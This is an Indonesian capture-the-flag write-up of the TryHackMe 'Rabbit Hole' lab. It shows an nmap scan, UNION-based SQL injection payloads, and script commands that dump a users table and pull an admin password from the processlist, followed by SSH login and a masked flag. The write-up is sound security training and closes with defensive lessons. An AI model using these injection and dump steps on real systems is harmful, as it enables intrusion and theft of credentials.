# Injection - Soal TryHackMe: Rabbit Hole

## 1. Soal
Eksploitasi SQL Injection pada room **Rabbit Hole (TryHackMe)** hingga mendapatkan akses ke server (SSH) dan capture flag.

---

## 2. Link Resource
- [TryHackMe: Rabbit Hole Room](https://tryhackme.com/room/rabbithole)
- [SQL Injection Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Information Schema MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
- [Burp Suite](https://portswigger.net/burp)

---

## 3. Jawaban + Bukti

### Step 1: Initial Reconnaissance
- Scan port untuk menemukan service:

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.173.12
```

- Hasil:  
  - `22/tcp` → SSH  
  - `80/tcp` → HTTP (login/register page dengan fitur “Last Logins”).  

![Recon Screenshot](step1.png)

---

### Step 2: SQL Injection Detection
- Uji coba payload:

```sql
' UNION SELECT 1;--
```

- Error muncul → column mismatch.  
- Payload valid:

```sql
' UNION SELECT 1,2;--
```

→ Mengonfirmasi ada 2 kolom.  

![SQLi Detect](step2.png)

---

### Step 3: Extract Database Names
- Gunakan automation script:

```bash
python3 sqli_automate2.py 'http://10.10.173.12/'   'SELECT group_concat(schema_name) FROM information_schema.schemata'
```

- Output:

```
information_schema,web
```

---

### Step 4: Extract Table Names
```bash
python3 sqli_automate2.py 'http://10.10.173.12/'   'SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema="web"'
```

- Output:

```
users,logins
```

---

### Step 5: Extract Columns
```bash
python3 sqli_automate2.py 'http://10.10.173.12/'   'SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema="web" AND table_name="users"'
```

- Output:

```
id,username,password,group
```

---

### Step 6: Dump User Data
```bash
python3 sqli_automate2.py 'http://10.10.173.12/'   'SELECT group_concat(id,":",username,":",password,":",`group` SEPARATOR "\n") FROM web.users WHERE id<4'
```

- Output:

```
1:admin:0e3ab8...:admin
2:foo:abc123:user
3:bar:iloveyou:user
```

---

### Step 7: Processlist Exploit
- Pantau query yang sedang berjalan:

```bash
python3 processlist_extractor.py 'http://10.10.173.12/'   'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'
```

- Hasil: terlihat query login admin dengan **MD5(password)**.  
- Contoh:

```sql
SELECT * FROM users WHERE username='admin' AND password=md5('fEeFBqOXBOLmjpTt0B3LN...')
```

- Password plaintext berhasil diambil dari dalam fungsi `md5()`.

---

### Step 8: SSH Login
```bash
ssh admin@10.10.173.12
```

- Password: hasil dari step sebelumnya.  

![SSH Access](step8.png)

---

### Step 9: Capture the Flag
```bash
ls
cat flag.txt
```

- Flag ditemukan:  

```
THM{**********************************************}
```

![Flag Screenshot](flag.png)

---

## 4. Refleksi
- **Berhasil**: eksploitasi SQLi → enumerasi schema → dump data → sniffing query dengan `processlist` → login SSH.  
- **Catatan**: Challenge ini unik karena menggunakan **second-order SQLi** & abuse dari `information_schema.processlist`.  
- **Pembelajaran**: pentingnya prepared statement, pembatasan hak akses DB user, dan monitoring query sensitif.
